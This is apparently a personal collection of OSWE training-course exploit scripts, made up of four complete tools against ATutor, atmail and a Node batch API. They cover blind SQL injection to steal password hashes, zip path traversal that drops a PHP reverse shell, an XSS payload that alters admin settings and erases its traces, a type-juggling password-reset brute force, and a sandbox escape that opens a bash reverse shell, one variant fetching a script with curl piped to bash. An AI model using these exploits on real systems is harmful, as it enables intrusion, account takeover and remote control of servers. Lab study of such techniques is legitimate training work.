## Exploit Scripts

These scripts are excerpts from my solutions to various OSWE challenges within the course (Not exam). They remain as a placeholder for me to refer back to programming certain exploits.

### Blind Error-Based SQLi to File Upload RCE

```python
#!/usr/bin/python3
import telnetlib 
import threading
import socket
import sys
import requests
import hashlib
import base64
import zipfile
import string
import random
import re
from io import BytesIO

# NOTE: Must be run from a writeable directory to allow the zip file to be created.

def setupListener(lhost, lport):
  print(f"[*] Now listening on host {lhost} and {lport}")
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  telnet = telnetlib.Telnet()
  sock.bind((lhost, int(lport)))
  # Wait for connections
  sock.listen(1)
  # Accept the connection
  connection, address = sock.accept()
  # Bind the connection to telnets socket
  telnet.sock = connection
  print("[*] Shell connected! Run your commands below.")
  telnet.interact()

def searchFriends_sqli(ip, inj_str):
    target      = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str)
    r = requests.get(target, proxies={"http" : "http://127.0.0.1:8080"})
    ## This might need to be fine-tuned
    if (int(r.headers['Content-Length']) > 20):
        return True
    else:
        return False

def inject(ip, query):
    count = 0
    res = ""
    for i in range(1,100):
        # ASCII Range in Dec
        for y in range(32, 126):
            count += 1
            if count > (126-32):
                print("\n[!] No more characters found! Extraction either solved or error in code.")
                print(f"[*] Result: {res}")
                return res
            injection = f"AAAA')/**/OR/**/(select/**/ascii(substring(({query}),{i},1)))={y}%23"
            if searchFriends_sqli(ip, injection):
                print(chr(y), end='', flush=True)
                res += chr(y)
                count = 0
                break
            else:
                continue

def write_zip(ip, lhost, lport, sess):
  filename = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(12)) + ".php5"
  b64shell = base64.b64encode(f"bash  -i  >&  /dev/tcp/{lhost}/{lport}     0>&1".encode())
  b64shell = b64shell.decode()
  shell = f"<?php system('echo {b64shell} | base64 -d | bash');?>"
  zipfname = "test.zip"
  f = BytesIO()
  z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
  z.writestr(f'../../../../../../var/www/html/ATutor/mods/{filename}', shell)
  z.writestr('imsmanifest.xml', 'badxml')
  z.close()
  zip = open(zipfname, 'wb')
  zip.write(f.getvalue())
  zip.close()
  print(f"[*] Wrote zip file {zipfname} and malicious php file {filename}.")
  upload_zip(ip, filename, zipfname, sess)


def upload_zip(ip, filename, zipfname, s):
  uri = f"http://{ip}/ATutor/mods/_standard/tests/import_test.php"
  name = "file"
  file = open(zipfname, "rb")
  content_type = "application/zip"
  files = { name : ( zipfname, file, content_type, {'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0'} )}
  data = { 'submit_import' : 'Import'}
  upload = s.post(uri, files=files, data=data, proxies={"http" : "http://127.0.0.1:8080"})
  if upload.status_code == 200:
    if "XML" in upload.text:
        execute_shell(ip, filename, s)
  else: 
    print("[!] File failed to upload.")


def execute_shell(ip, filename, s):
  print("[*] Executing php shell..")
  execute = s.get(f"http://{ip}/ATutor/mods/{filename}")
  if execute.status_code == 200:
    print("[*] Found shell. Executing...")
  else: 
    print("[!] Couldn't find the shell file! Check upload worked.")
    sys.exit(2)
  return 0

def gen_hash(input):
    hashed_value = hashlib.sha1(input.encode()).hexdigest()
    print(hashed_value)
    return hashed_value


def login_with_hash(hazh, ip, user, lhost, lport):
    print(f"[*] Attempting to login with extracted hash...")
    token = "boop"
    concat_hash_tkn = hazh + token
    hidden_field_passwd = gen_hash(concat_hash_tkn)
    uri = f"http://{ip}/ATutor/login.php"
    data = {
        "form_login_action" : "true",
        "form_course_id" : "0",
        "form_password_hidden" : hidden_field_passwd,
        "form_login" : user,
        "submit" : "Login",
        "token" : token
    }
    success = "My Courses"
    with requests.Session() as s:
        sess = s.post(uri, data = data, proxies={"http" : "http://127.0.0.1:8080"})
        if success in sess.text:
            print("[*] Successfully logged in with the hash!")
            print("[*] Going to course page...")
            #bounce.php?course=16777215
            find_course = re.search(r"bounce\.php\?course=[1-9][0-9]*", sess.text)
            print(find_course)
            course_page = f"http://{ip}/ATutor/{find_course[0]}"
            print(course_page)
            s.get(course_page)
            write_zip(ip, lhost, lport, s)
        else:
            print("[!] Login failed!")


def main():

    if len(sys.argv) != 5:
      print(f"(*) usage: {sys.argv[0]} <target> <username> <lhost> <lport>")
      print(f'(*) eg: {sys.argv[0]} 192.168.121.103 teacher')
      print(f'(*) eg: {sys.argv[0]} 192.168.121.103 brute (Use brute when you don\'t know the username)')
      sys.exit(-1)

    ip                  = sys.argv[1]
    user                = sys.argv[2]
    lhost               = sys.argv[3]
    lport               = sys.argv[4]
    known_user          = f"select/**/password/**/from/**/AT_members/**/where/**/login='{user}'"
    discover_user       = f"select/**/login/**/from/**/AT_members/**/LIMIT/**/1"

    # Starting listener on designated port
    t = threading.Thread(target=setupListener, args=(lhost, lport))
    t.start()

    if user != "brute": 
        print(f"[*] Extracting password for known user: {user}")
        passwd = inject(ip, known_user)
        login_with_hash(passwd, ip, user, lhost, lport)
        sys.exit()
    else:
        print(f"[*] Finding usernames... ")
        new_user = inject(ip, discover_user)
        print(f"[*] Found user: {new_user}")
        print(f"[*] Now extracting their password...")
        extract_new_user_pw = f"select/**/password/**/from/**/AT_members/**/where/**/login='{new_user}'"
        passwd = inject(ip, extract_new_user_pw)
        login_with_hash(passwd, ip, new_user, lhost, lport)


if __name__ == "__main__":
    main()
```



### Javascript XSS to Shell

Forces the administrator to change setting and then uploads a malicious paylaod through a file upload exploit. Cleans up after itself. Uses XMLHttpRequest rather than fetch.

```js
function readBody(xhr) {
	var data;
	if (!xhr.responseType || xhr.responseType === "text") {
		data = xhr.responseText;
	} else if (xhr.responseType === "document") {
		data = xhr.responseXML;
	} else if (xhr.responseType === "json") {
		data = xhr.responseJSON;
	} else {
		data = xhr.response;
	}
	return data;
}

function changeGlobal() {
	var uri = "/index.php/admin/settings/globalsave";

	x = new XMLHttpRequest();
	x.open("POST", uri, true);
	x.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	x.send("save=1&fields%5Bsql_user%5D=root&fields%5Bsql_pass%5D=956ec84a45e0675851367c7e480ec0e9&fields%5Bsql_table%5D=atmail6&fields%5BtmpFolderBaseName%5D=");
	findEmail();
}

function findEmail() {
	var uri = "/index.php/mail/mail/listfoldermessages";
	x = new XMLHttpRequest;
	x.onreadystatechange = function() {
		if (x.readyState === XMLHttpRequest.DONE) {
			var res = readBody(x);
			let find_id = /id=\\"\d+\\"/;
			let extract_id = res.match(find_id)[0];
			let msg_id = extract_id.match(/\d+/)[0];
			deleteTraces(msg_id);
		}
	}
	x.open("GET", uri, true);
	x.send(null);
}

function deleteTraces(msg_id) {
	var uri =  "/index.php/mail/mail/movetofolder/fromFolder/INBOX/toFolder/INBOX.Trash";
	// Unseen is set to 0 as we assume they read the message to trigger the XSS
	var queryString = "?resultContext=messageList&listFolder=INBOX&mailId%5B%5D=" + msg_id + "&unseen%5B7%5D=0";

	x = new XMLHttpRequest();
	x.open("GET", uri + queryString, true);
	x.send(null)
	emptyTrash();
}

function emptyTrash() {
	var uri = "/index.php/mail/mail/emptyfolder/folder/INBOX.Trash/contextId/%23messageList";
	x = new XMLHttpRequest();
	x.open("GET", uri, true);
	x.send(null);
	setTimeout(uploadFile(), 1000);
}

function uploadFile() {
	//var shell = "testing";
	var shell = "<?php $ip=$_GET['ip']; $port=$_GET['port']; $string = \"/bin/bash -c 'bash -i >& /dev/tcp/\" . $ip . \"/\" . $port . \" 0>&1' \"; exec($string);?>";
	var filename = (Math.random() + 1).toString(36).substring(2) + ".php";
	var fileSize = shell.length;
	var boundary = "---------------------------114372167112602535532377364984";
	var uri = "/index.php/mail/composemessage/addattachment/composeID/";
	
	x = new XMLHttpRequest();
	x.open("POST", uri, true);
	x.setRequestHeader("Content-Type", "multipart/form-data; boundary=" + boundary);
	x.withCredentials = true;

	var body = "";
	body += "--" + boundary + "\r\n";
	body += 'Content-Disposition: form-data; name="newAttachment"; filename="' + filename + '"\r\n\r\n';
	//body += "Content-Type: \r\n\r\n";
	body += shell + "\r\n";
	body += "--" + boundary + "--";
	console.log(body);
	x.send(body);
	setTimeout(executeShell, 5000, filename);
	return true;
}

function executeShell(filename) {
	var ip = "192.168.119.176";
	var port = 443;
	var uri = "/a/d/adminoffseclocal/--" + filename + "?ip=" + ip + "&port=" + port;
	x = new XMLHttpRequest();
	x.open("GET", uri, true);
	x.send(null);
}

changeGlobal();
```


### Threaded Type Juggling Password Reset Brute Force

```python
import hashlib
import requests
import random
import string 
import re
import sys
import os
import time
import threading

class t(threading.Thread):
	def __init__(self, tid, name, n, g, ip, target_id, passw, tcount):
		threading.Thread.__init__(self)
		self.tid = tid
		self.name = name
		self.n = n
		self.g = g
		self.ip = ip
		self.target_id = target_id
		self.passw = passw
		self.tcount = tcount

	def run(self): 
		print (f"Starting {self.name}")
		# If the password starts with a letter, it gets ignored and only id + i get evaluated
		# If the password hash starts with a number, it gets treated as a number up until it meets a letter
		# Just php things <3
		for x in range(self.tid, self.n, self.tcount):
			print(f"{self.name} has x value {x}")
			for i in range(self.g, 100000):
				# First, we try with no values assuming it's [a-z][A-Z] for the first password character
				if x == 0:
					prehash = int(self.target_id) + i
				else:
					prehash = int(self.target_id) + i + x
				generated_hash_substr = self.hash_generation(prehash)[5:5+15]
				valid = re.search(r"0e\d{13}", generated_hash_substr)
				if valid:
					#print(f"[*] Potential hash found!\n[*] {i} evaluates to: {valid[0]}")
					#print(f"[*] Current prefix: {x}")
					#print(f"[*] Trying reset...")
					self.visit_reset_link(self.ip, self.target_id, i, self.passw)				

	def hash_generation(self, req):
		m = hashlib.sha1()
		m.update(str(req).encode())
		return m.hexdigest()


	def visit_reset_link(self, target, id, g, passw):
		# Content length when asked for a new value
		uri = f"http://{target}/ATutor/password_reminder.php?id={id}&g={g}&h=0"
		print(f"[*] Sending reset request to {uri} with {self.name}")
		s = requests.Session()
		x = s.get(uri, proxies={"http":"http://127.0.0.1:8080"})
		if "invalid" not in x.text:
			print(f"[*] It worked with value {g}!")
			self.reset_pw(target, g, passw, s, id)
			
	def reset_pw(self, target, g, pw, s, id):
		uri = f"http://{target}/ATutor/password_reminder.php"
		data = {
			"form_change" : "true",
			"id" : id,
			"g" : g,
			"h" : "0",
			"form_password_hidden" : hashlib.sha1(pw.encode()).hexdigest(),
			"password_error" : "",
			"password" : pw,
			"password2" : pw,
			"submit" : "Submit"
		}

		x = s.post(uri, data=data, proxies={"http":"http://127.0.0.1:8080"}, allow_redirects=False)
		if x.status_code == 302:
			print(f"[*] Password Successfully Changed to {pw}!")
			os._exit(0)
		else:
			print(f"[!] Password change failed!")



def main():

	if len(sys.argv) != 5:
		print(f"[!] Invalid number of arguments.\n[*] Usage: {sys.argv[0]} <target> <target_id> <attempts ^ 10> <new password>")
		sys.exit()
	
	# echo intval(((time()/60)/60)/24);
	current_time_value = int(((int(time.time())/60)/60)/24)

	target 			= sys.argv[1]
	target_id 		= sys.argv[2]
	num_req			= int(sys.argv[3]) ** 10
	passw 			= sys.argv[4]
	n_threads		= 25

	threads = []

	for thr in range(n_threads):
		# Give each thread an ID, name, max amount by taking max requests / threads, g value, target, target ID, new password and no.threads
		thread = t(thr, f"Thread Number: {thr}", int(num_req/n_threads), current_time_value, target, target_id, passw, n_threads)
		thread.start()
		threads.append(thread)

	for x in threads:
		x.join()

if __name__ == "__main__":
	main()
```


### Javascript safe_eval() Command Injection 

```python
import requests
import sys
import threading
import socket
import telnetlib

def setupListener(lhost, lport):
  print(f"[*] Now listening on host {lhost} and port {lport}")
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  telnet = telnetlib.Telnet()
  sock.bind((lhost, int(lport)))
  # Wait for connections
  sock.listen(1)
  # Accept the connection
  connection, address = sock.accept()
  # Bind the connection to telnets socket
  telnet.sock = connection
  print("[*] Shell connected! Run your commands below.")
  telnet.interact()


def send_batch(target, lhost, lport):
	# PoC
	#badstuff = 'ref.constructor.constructor(\'return process\')().exit()'

	# WORKS! Host a file called shell.sh with a reverse shell
	#badstuff_working_1 = 'var y = ref.constructor.constructor(\'return process\')().mainModule.require(\'child_process\');y.exec(\'curl 192.168.119.239\\\\x2fshell.sh|bash\')'

	# Uses js rather than system commands - doesn't require hosting a shell script
	encoded_cmd = "\\\\x2fbin\\\\x2fbash"
	badstuff_working_2 = 'var net = ref.constructor.constructor(\'return process\')().mainModule.require(\'net\');'
	badstuff_working_2 += 'var sh = ref.constructor.constructor(\'return process\')().mainModule.require(\'child_process\').exec(\'%s\');' % encoded_cmd 
	badstuff_working_2 += 'var client = new net.Socket();'
	badstuff_working_2 += 'client.connect(%s, \'%s\', function(){client.pipe(sh.stdin);' % (lport, lhost)
	badstuff_working_2 += 'sh.stdout.pipe(client);sh.stderr.pipe(client);});'

	request_1 = '{"method":"get","path":"/profile"}'
	request_2 = '{"method":"get","path":"/item"}'
	#request_3 = f'{{"method":"get","path":"/item/$1.id;{badstuff_working_1}"}}'
	request_3 = f'{{"method":"get","path":"/item/$1.id;{badstuff_working_2}"}}'

	json =  f'{{"requests":[{request_1},{request_2},{request_3}]}}'
	print(json)
	r = requests.post(target, json)
	print(r.text)
	
def main():

	if len(sys.argv) != 4:
	    print(f"[*] usage: {sys.argv[0]} <target> <lhost> <lport>")
	    sys.exit(0)
	    
	target = f"http://{sys.argv[1]}:8080/batch"
	lhost = sys.argv[2]
	lport = sys.argv[3]

	# Starting listener on designated port
	t = threading.Thread(target=setupListener, args=(lhost, lport))
	t.start()

	send_batch(target, lhost, lport)

if __name__ == '__main__':
	main()
```


